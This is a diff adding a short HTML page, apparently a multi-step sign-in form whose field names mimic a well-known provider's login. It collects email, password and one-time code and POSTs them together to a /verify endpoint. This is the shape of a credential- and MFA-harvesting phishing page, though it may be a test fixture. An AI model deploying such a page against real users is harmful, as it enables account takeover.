@@ -1,0 +1,16 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><link rel="stylesheet" href="/style.css"><title>Single-page multi-step</title></head><body>
+<h1>Sign in</h1>
+<div id="s1"><label for="identifierId">Email or phone</label><input type="email" id="identifierId" name="identifier" autocomplete="username"><button id="n1">Next</button></div>
+<div id="s2" class="hidden"><p id="who"></p><label for="pw">Enter your password</label><input type="password" name="Passwd" id="pw"><button id="n2">Next</button></div>
+<div id="s3" class="hidden"><label for="totpPin">Enter code</label><input type="tel" id="totpPin" name="totpPin" autocomplete="one-time-code"><button id="n3">Next</button></div>
+<div id="done" class="hidden"></div>
+<script>
+const $ = (id) => document.getElementById(id);
+$("n1").onclick = () => { $("who").textContent = $("identifierId").value; $("s1").classList.add("hidden"); setTimeout(() => $("s2").classList.remove("hidden"), 150); };
+$("n2").onclick = () => { $("s2").classList.add("hidden"); setTimeout(() => $("s3").classList.remove("hidden"), 150); };
+$("n3").onclick = async () => {
+  const r = await fetch("/verify", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ site: "login", u: $("identifierId").value, p: $("pw").value, code: $("totpPin").value }) });
+  $("s3").classList.add("hidden"); $("done").classList.remove("hidden"); $("done").textContent = await r.text();
+};
+</script>
+</body></html>
